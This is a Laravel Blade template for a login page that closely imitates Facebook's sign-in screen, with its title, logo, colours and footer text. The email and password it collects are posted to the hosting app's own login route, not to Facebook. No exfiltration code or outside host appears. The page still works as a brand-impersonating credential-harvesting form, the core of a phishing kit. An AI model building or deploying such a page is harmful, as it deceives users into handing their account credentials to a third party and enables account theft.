<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Login | Facebook</title>
    @vite(['resources/css/app.css'])
    <style>
        :root {
            --fb-blue: #1877F2;
            --fb-blue-hover: #166fe5;
        }
        .bg-fb { background-color: var(--fb-blue); }
        .text-fb { color: var(--fb-blue); }
        .bg-glow {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: radial-gradient(circle at 50% 50%, rgba(24, 119, 242, 0.08) 0%, rgba(255, 255, 255, 0) 70%);
            z-index: -1;
        }
    </style>
</head>
<body class="bg-[#f0f2f5] min-h-screen flex items-center justify-center p-4 antialiased font-sans">
    <div class="bg-glow"></div>
    
    <div class="w-full max-w-[420px]">
        <div class="text-center mb-6">
            <div class="inline-flex items-center justify-center w-20 h-20 bg-white rounded-full shadow-md mb-4 border border-gray-100">
                <svg class="w-12 h-12 text-fb" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
            </div>
            <h1 class="text-3xl font-bold text-fb tracking-tight">facebook</h1>
            <p class="text-gray-600 mt-2 text-lg">We're glad to see you again</p>
        </div>

        <div class="bg-white rounded-xl shadow-[0_2px_4px_rgba(0,0,0,0.1),0_8px_16px_rgba(0,0,0,0.1)] p-6 md:p-8">
            
            <form method="POST" action="{{ route('login') }}" id="loginForm" class="space-y-4">
                @csrf

                <div>
                    <input 
                        type="email" id="email" name="email" value="{{ old('email') }}" required autofocus 
                        class="w-full px-4 py-3.5 border border-gray-300 rounded-lg focus:ring-1 focus:ring-fb focus:border-fb outline-none transition-all text-lg @error('email') border-red-500 @enderror"
                        placeholder="Email or phone number"
                    >
                    @error('email')
                        <p class="mt-1 text-xs text-red-500 ml-1">{{ $message }}</p>
                    @enderror
                </div>

                <div>
                    <input 
                        type="password" id="password" name="password" required 
                        class="w-full px-4 py-3.5 border border-gray-300 rounded-lg focus:ring-1 focus:ring-fb focus:border-fb outline-none transition-all text-lg @error('password') border-red-500 @enderror"
                        placeholder="Password"
                    >
                    @error('password')
                        <p class="mt-1 text-xs text-red-500 ml-1">{{ $message }}</p>
                    @enderror
                </div>

                <button 
                    type="submit" id="submitBtn"
                    class="w-full bg-fb hover:bg-[#166fe5] text-white font-bold py-3.5 rounded-lg transition-all text-xl flex items-center justify-center gap-3"
                >
                    <span id="btnText">Log In</span>
                    <svg id="btnLoader" class="w-6 h-6 animate-spin hidden" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-20" cx="12" cy="12" r="10" stroke="#000" stroke-width="4"></circle>
                        <path class="opacity-100" fill="#fff" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                </button>

                <div class="text-center pt-2">
                    @if (Route::has('password.request'))
                        <a href="{{ route('password.request') }}" class="text-sm text-fb hover:underline">
                            Forgotten password?
                        </a>
                    @endif
                </div>

                <hr class="my-6 border-gray-200">

                <div class="text-center">
                    <button type="button" class="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold py-3 px-4 rounded-lg transition-all text-md shadow-sm">
                        Create new account
                    </button>
                </div>
            </form>
        </div>

        <div class="mt-8 text-center px-4">
            <p class="text-gray-500 text-xs">
                <b>Create a Page</b> for a celebrity, brand or business.
            </p>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const btnLoader = document.getElementById('btnLoader');

        form.addEventListener('submit', function() {
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.8';
            btnText.textContent = 'Logging in...';
            btnLoader.classList.remove('hidden');
        });
    </script>
</body>
</html>